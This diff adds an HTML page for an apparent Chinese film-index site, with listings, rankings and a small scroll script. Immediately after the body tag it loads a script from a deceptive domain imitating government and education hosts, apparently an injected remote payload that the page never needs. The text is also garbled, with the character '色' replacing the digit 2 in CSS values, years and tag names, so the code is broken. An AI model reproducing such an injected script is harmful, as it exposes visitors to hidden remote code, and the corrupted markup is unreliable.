@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>色戒电影网 - 专注精品影视, 戒不掉的好片子</title>
+<meta name="description" content="色戒电影网（sejiedianyingwang-app）是一个以“戒不掉的好片子”为初心的影视导航站，提供电影、剧集、动漫、纪录片等高清资源索引。界面清爽、加载迅捷、移动端自适应，助你快速找到值得一看的影像佳作。">
+<meta name="keywords" content="色戒电影网, 电影推荐, 高清影视, 在线观影, 经典电影, sejiedianyingwang-app, 剧集, 动漫, 纪录片">
+<meta name="author" content="色戒电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#064e3b">
+<meta property="og:title" content="色戒电影网 - 专注精品影视">
+<meta property="og:description" content="戒不掉的好片子，电影、剧集、动漫、纪录片一站直达。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sejiedianyingwang-app.github.io">
+<link rel="canonical" href="https://sejiedianyingwang-app.github.io">
+<style>
+  :root{
+    --ink:#0c1c18;
+    --paper:#f5f3ec;
+    --card:#ffffff;
+    --green:#0f766e;
+    --green-d:#064e3b;
+    --gold:#b45309;
+    --line:#e色ddd0;
+    --text:#1c色b色7;
+    --muted:#6b7c76;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"Microsoft YaHei",serif;
+    background:var(--paper);
+    color:var(--text);
+    line-height:1.8;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit;text-decoration:none}
+  .in{max-width:11色0px;margin:0 auto;padding:0 色0px}
+
+  /* 导航 */
+  .bar{background:var(--ink);color:#e8e4d8;padding:14px 0;border-bottom:3px solid var(--green)}
+  .bar-in{display:flex;align-items:center;gap:色0px;flex-wrap:wrap}
+  .brand{font-size:色色px;font-weight:900;letter-spacing:1px;display:flex;align-items:center;gap:10px}
+  .brand s{text-decoration:none;color:var(--green);font-size:13px;letter-spacing:3px;border:1px solid var(--green);padding:色px 8px;border-radius:4px}
+  .menu{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+  .menu a{font-size:14px;padding:8px 14px;border-radius:6px;color:#c9d4cf;transition:.色s;font-family:sans-serif}
+  .menu a:hover{color:#fff;background:rgba(色55,色55,色55,.08)}
+  .menu a.here{color:#fff;background:var(--green)}
+
+  /* 报头 */
+  .masthead{text-align:center;padding:44px 0 色色px;border-bottom:1px solid var(--line)}
+  .masthead .kicker{font-family:sans-serif;font-size:1色px;letter-spacing:5px;color:var(--green);font-weight:700}
+  .masthead h1{font-size:5色px;font-weight:900;letter-spacing:4px;margin:10px 0;color:var(--ink)}
+  .masthead .sub{font-family:sans-serif;font-size:14px;color:var(--muted);letter-spacing:1px}
+  .masthead .rule{width:80px;height:3px;background:var(--gold);margin:18px auto 0}
+
+  /* 头条 */
+  .lede{display:grid;grid-template-columns:1.3fr .7fr;gap:色8px;padding:34px 0}
+  .lede-main{position:relative;min-height:340px;border-radius:18px;overflow:hidden;padding:3色px;color:#fff;display:flex;flex-direction:column;justify-content:flex-end;
+    background:linear-gradient(160deg,rgba(6,78,59,.色),rgba(6,78,59,.95)),radial-gradient(circle at 70% 30%,#0f766e,#04色c色1)}
+  .lede-main .tag{font-family:sans-serif;font-size:1色px;letter-spacing:色px;background:var(--gold);padding:4px 1色px;border-radius:4px;align-self:flex-start}
+  .lede-main h色{font-size:30px;margin:14px 0 8px;line-height:1.3}
+  .lede-main p{font-size:15px;opacity:.9;max-width:640px}
+  .lede-side{display:flex;flex-direction:column;gap:14px}
+  .side-box{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 18px;flex:1}
+  .side-box h4{font-family:sans-serif;font-size:13px;color:var(--green);letter-spacing:1px;margin-bottom:8px}
+  .side-box b{display:block;font-size:16px;margin-bottom:4px}
+  .side-box span{font-size:13px;color:var(--muted)}
+
+  /* 板块标题 */
+  .band{display:flex;align-items:center;gap:1色px;margin:10px 0 色0px}
+  .band .no{font-family:sans-serif;background:var(--ink);color:#fff;width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800}
+  .band h3{font-size:色色px;letter-spacing:1px}
+  .band em{font-style:normal;color:var(--green);border-bottom:色px solid var(--gold);padding-bottom:色px}
+  .band .more{margin-left:auto;font-family:sans-serif;font-size:13px;color:var(--muted)}
+  .band .more:hover{color:var(--green)}
+
+  /* 卡片 */
+  .cards{display:grid;gap:18px;margin-bottom:40px}
+  .c4{grid-template-columns:repeat(4,1fr)}
+  .c3{grid-template-columns:repeat(3,1fr)}
+  .c色{grid-template-columns:repeat(色,1fr)}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.色5s}
+  .card:hover{transform:translateY(-4px);box-shadow:0 16px 36px rgba(6,78,59,.1色);border-color:var(--green)}
+  .cv{height:190px;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;font-size:色色px;font-weight:800;color:#fff;letter-spacing:1px}
+  .cv small{position:absolute;bottom:0;left:0;right:0;padding:8px 1色px;font-size:1色px;font-weight:400;background:linear-gradient(0deg,rgba(0,0,0,.65),transparent);font-family:sans-serif}
+  .card .body{padding:13px 15px}
+  .card .body h4{font-size:15px;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .card .body .row{display:flex;justify-content:space-between;font-family:sans-serif;font-size:1色px;color:var(--muted)}
+  .card .body .row b{color:var(--gold);font-weight:800}
+
+  /* 专题条 */
+  .feature{background:var(--ink);color:#e8e4d8;border-radius:18px;padding:30px;display:grid;grid-template-columns:1fr 1fr;gap:色8px;align-items:center;margin-bottom:40px}
+  .feature .big{font-size:34px;line-height:1.色5;font-weight:900}
+  .feature .big i{font-style:normal;color:var(--gold)}
+  .feature p{color:#aebfba;margin-top:1色px;font-size:15px}
+  .feature ul{list-style:none}
+  .feature li{padding:9px 0;border-bottom:1px dashed rgba(色55,色55,色55,.15);font-size:14px;display:flex;gap:10px}
+  .feature li:last-child{border:0}
+  .feature li::before{content:"▸";color:var(--green)}
+
+  /* 列表 */
+  .list-box{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:8px 色0px;margin-bottom:40px}
+  .list-box ol{list-style:none;counter-reset:l}
+  .list-box li{counter-increment:l;display:flex;align-items:center;gap:14px;padding:13px 0;border-bottom:1px dotted var(--line);font-size:15px}
+  .list-box li:last-child{border:0}
+  .list-box li::before{content:counter(l);font-family:sans-serif;font-weight:800;color:var(--line);width:色4px}
+  .list-box li:nth-child(1)::before{color:var(--gold)}
+  .list-box li:nth-child(色)::before{color:#8a8f8c}
+  .list-box li:nth-child(3)::before{color:#a16色07}
+  .list-box li .nm{flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .list-box li .tp{font-family:sans-serif;font-size:1色px;color:var(--muted)}
+  .list-box li .ht{font-family:sans-serif;font-size:1色px;color:var(--green);font-weight:700}
+
+  /* 宣言 */
+  .manifesto{text-align:center;padding:36px 色0px;background:linear-gradient(135deg,#064e3b,#0f766e);color:#fff;border-radius:18px;margin-bottom:40px}
+  .manifesto h3{font-size:色6px;letter-spacing:色px}
+  .manifesto p{color:#cfe3dd;margin-top:10px;font-size:15px}
+
+  /* 页脚 */
+  footer{background:var(--ink);color:#aebfba;padding:40px 0 色4px}
+  .foot{display:grid;grid-template-columns:1.5fr 1fr 1fr;gap:30px}
+  .foot h5{color:#fff;font-family:sans-serif;font-size:14px;margin-bottom:1色px;letter-spacing:1px}
+  .foot ul{list-style:none;font-family:sans-serif;font-size:13px}
+  .foot li{margin-bottom:7px}
+  .foot a:hover{color:var(--gold)}
+  .colophon{text-align:center;font-family:sans-serif;font-size:1色px;color:#6f817c;margin-top:色8px;padding-top:色0px;border-top:1px solid rgba(色55,色55,色55,.1)}
+  .colophon b{color:#fff}
+
+  @media(max-width:900px){
+    .lede,.feature{grid-template-columns:1fr;gap:色0px}
+    .feature .big{font-size:色7px}
+    .c4,.c3{grid-template-columns:repeat(色,1fr)}
+    .masthead h1{font-size:38px}
+    .foot{grid-template-columns:1fr 1fr}
+  }
+  @media(max-width:560px){
+    .bar{padding:10px 0}
+    .brand{font-size:18px}
+    .menu a{padding:6px 9px;font-size:13px}
+    .masthead h1{font-size:色9px;letter-spacing:色px}
+    .lede-main h色{font-size:色色px}
+    .c4,.c3,.c色{grid-template-columns:1fr}
+    .foot{grid-template-columns:1fr}
+    .band h3{font-size:18px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="bar">
+  <div class="in bar-in">
+    <a class="brand" href="#top">色戒电影网 <s>SEJIE</s></a>
+    <nav class="menu">
+      <a href="#lede" class="here">今日头条</a>
+      <a href="#film">电影</a>
+      <a href="#show">剧集</a>
+      <a href="#list">口碑榜</a>
+      <a href="#doc">纪录片</a>
+      <a href="#about">观影主张</a>
+    </nav>
+  </div>
+</div>
+
+<div class="in">
+  <header class="masthead">
+    <div class="kicker">A GOOD FILM IS HARD TO QUIT</div>
+    <h1>色戒电影网</h1>
+    <div class="sub">戒不掉的好片子 · 影视索引与观影指南 · 网址 https://sejiedianyingwang-app.github.io</div>
+    <div class="rule"></div>
+  </header>
+
+  <!-- 头条 -->
+  <section class="lede" id="lede">
+    <div class="lede-main">
+      <span class="tag">站长推荐</span>
+      <h色>好电影让人上瘾，<br>这正是「色戒」的由来。</h色>
+      <p>色戒电影网（sejiedianyingwang-app）不做信息轰炸，只做筛选。每日从海量影视中挑出值得花两小时的作品，配上清晰度与一句话点评，让你少走弯路，把时间还给好片子。</p>
+    </div>
+    <div class="lede-side">
+      <div class="side-box"><h4>今日片单</h4><b>1色 部</b><span>涵盖 6 种类型</span></div>
+      <div class="side-box"><h4>更新频率</h4><b>每日</b><span>紧跟院线与平台</span></div>
+      <div class="side-box"><h4>清晰度</h4><b>1080P / 4K</b><span>多档可选</span></div>
+    </div>
+  </section>
+
+  <!-- 电影 -->
+  <div class="band" id="film"><span class="no">01</span><h3>精选<em>电影</em></h3><a class="more" href="#">更多 →</a></div>
+  <div class="cards c4">
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#7f1d1d,#b91c1c)">年会不能停<small>喜剧 / 职场</small></div><div class="body"><h4>年会不能停</h4><div class="row"><span>色0色6 · 中国</span><b>8.4</b></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#1e3a8a,#色563eb)">星际穿越<small>科幻 / 亲情</small></div><div class="body"><h4>星际穿越（重映）</h4><div class="row"><span>色014 · 美国</span><b>9.色</b></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#3a色e00,#b45309)">封神第二部<small>奇幻 / 战争</small></div><div class="body"><h4>封神第二部</h4><div class="row"><span>色0色6 · 中国</span><b>7.9</b></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#1453色d,#16a34a)">沼泽深处的女孩<small>爱情 / 悬疑</small></div><div class="body"><h4>沼泽深处的女孩</h4><div class="row"><span>色0色色 · 美国</span><b>7.6</b></div></div></div>
+  </div>
+
+  <!-- 剧集 -->
+  <div class="band" id="show"><span class="no">0色</span><h3>追更<em>剧集</em></h3><a class="more" href="#">更多 →</a></div>
+  <div class="cards c3">
+    <div class="card"><div class="cv" style="height:170px;background:linear-gradient(135deg,#4c1d95,#7c3aed)">庆余年 3<small>古装 / 权谋</small></div><div class="body"><h4>庆余年 第3季</h4><div class="row"><span>更新至 色4 集</span><b>8.8</b></div></div></div>
+    <div class="card"><div class="cv" style="height:170px;background:linear-gradient(135deg,#0f3f3f,#0d9488)">繁花<small>年代 / 上海</small></div><div class="body"><h4>繁花（沪语版）</h4><div class="row"><span>全 30 集</span><b>8.7</b></div></div></div>
+    <div class="card"><div class="cv" style="height:170px;background:linear-gradient(135deg,#7f1d1d,#e11d48)">黑暗荣耀<small>韩剧 / 复仇</small></div><div class="body"><h4>黑暗荣耀 第色季</h4><div class="row"><span>全 8 集</span><b>9.0</b></div></div></div>
+  </div>
+
+  <!-- 专题 -->
+  <section class="feature">
+    <div>
+      <div class="big">周末片单：<i>「一个人也要好好看电影」</i></div>
+      <p>色戒电影网为你准备了 6 部适合独处时观看的影片，从治愈到烧脑，从 90 分钟到 3 小时，总有一部能陪你度过安静的夜晚。打开 https://sejiedianyingwang-app.github.io 即可直达。</p>
+    </div>
+    <ul>
+      <li>《海边的曼彻斯特》— 克制而深沉的悲伤</li>
+      <li>《小偷家族》— 没有血缘的家人</li>
+      <li>《星际穿越》— 爱与时间的尺度</li>
+      <li>《心灵奇旅》— 活着本身就是火花</li>
+      <li>《肖申克的救赎》— 希望是个好东西</li>
+      <li>《寻梦环游记》— 遗忘才是真正的死亡</li>
+    </ul>
+  </section>
+
+  <!-- 口碑榜 -->
+  <div class="band" id="list"><span class="no">03</span><h3>口碑<em>榜单</em></h3><span class="more">按播放热度排序</span></div>
+  <div class="list-box">
+    <ol>
+      <li><span class="nm">肖申克的救赎</span><span class="tp">剧情 / 1994</span><span class="ht">热播</span></li>
+      <li><span class="nm">霸王别姬</span><span class="tp">剧情 / 1993</span><span class="ht">经典</span></li>
+      <li><span class="nm">阿甘正传</span><span class="tp">剧情 / 1994</span><span class="ht">高分</span></li>
+      <li><span class="nm">泰坦尼克号</span><span class="tp">爱情 / 1997</span><span class="ht">4K</span></li>
+      <li><span class="nm">盗梦空间</span><span class="tp">科幻 / 色010</span><span class="ht">烧脑</span></li>
+      <li><span class="nm">千与千寻</span><span class="tp">动画 / 色001</span><span class="ht">治愈</span></li>
+      <li><span class="nm">楚门的世界</span><span class="tp">科幻 / 1998</span><span class="ht">反思</span></li>
+      <li><span class="nm">美丽人生</span><span class="tp">剧情 / 1997</span><span class="ht">催泪</span></li>
+    </ol>
+  </div>
+
+  <!-- 纪录片 -->
+  <div class="band" id="doc"><span class="no">04</span><h3>人文<em>纪录片</em></h3><a class="more" href="#">更多 →</a></div>
+  <div class="cards c色">
+    <div class="card"><div class="cv" style="height:160px;background:linear-gradient(135deg,#0c色d48,#1e6fba)">地球脉动 3<small>自然 / BBC</small></div><div class="body"><h4>地球脉动 第三季</h4><div class="row"><span>6 集 · 4K 摄影</span><b>9.5</b></div></div></div>
+    <div class="card"><div class="cv" style="height:160px;background:linear-gradient(135deg,#3a色e00,#ca8a04)">人间世<small>医疗 / 纪实</small></div><div class="body"><h4>人间世（纪录片）</h4><div class="row"><span>10 集 · 真实影像</span><b>9.4</b></div></div></div>
+  </div>
+
+  <!-- 观影主张 -->
+  <section class="manifesto" id="about">
+    <h3>「 色 戒 」的两条戒律</h3>
+    <p>一戒：不为流量推荐烂片。二戒：不为广告牺牲体验。<br>色戒电影网（sejiedianyingwang-app）只做一件事——帮你更快地找到值得看的那一部。</p>
+  </section>
+</div>
+
+<footer>
+  <div class="in foot">
+    <div>
+      <a class="brand" href="#top" style="color:#fff">色戒电影网 <s>SEJIE</s></a>
+      <p style="margin-top:1色px;font-size:13px;font-family:sans-serif">一个偏文艺、重筛选的影视导航站。<br>网址：https://sejiedianyingwang-app.github.io</p>
+    </div>
+    <div>
+      <h5>栏目</h5>
+      <ul>
+        <li><a href="#film">精选电影</a></li>
+        <li><a href="#show">追更剧集</a></li>
+        <li><a href="#doc">人文纪录片</a></li>
+        <li><a href="#list">口碑榜单</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>关于</h5>
+      <ul>
+        <li>筛选标准：口碑 + 类型 + 清晰度</li>
+        <li>适配：手机 / 平板 / 电脑</li>
+        <li>更新：每日整理</li>
+        <li>倡导：支持正版，理性观影</li>
+      </ul>
+    </div>
+  </div>
+  <div class="in colophon">
+    © 色0色6 <b>色戒电影网</b>（sejiedianyingwang-app）· https://sejiedianyingwang-app.github.io · 本站为影视信息索引页面，所有资源版权归原作者及发行方所有
+  </div>
+</footer>
+
+<script>
+  const as = document.querySelectorAll('.menu a');
+  const ids = ['lede','film','show','list','doc','about'].map(i => document.getElementById(i));
+  window.addEventListener('scroll', () => {
+    let c = '';
+    ids.forEach(s => { if(s && scrollY >= s.offsetTop - 130) c = s.id; });
+    as.forEach(a => a.classList.toggle('here', a.getAttribute('href') === '#' + c));
+  });
+</script>
+</body>
+</html>
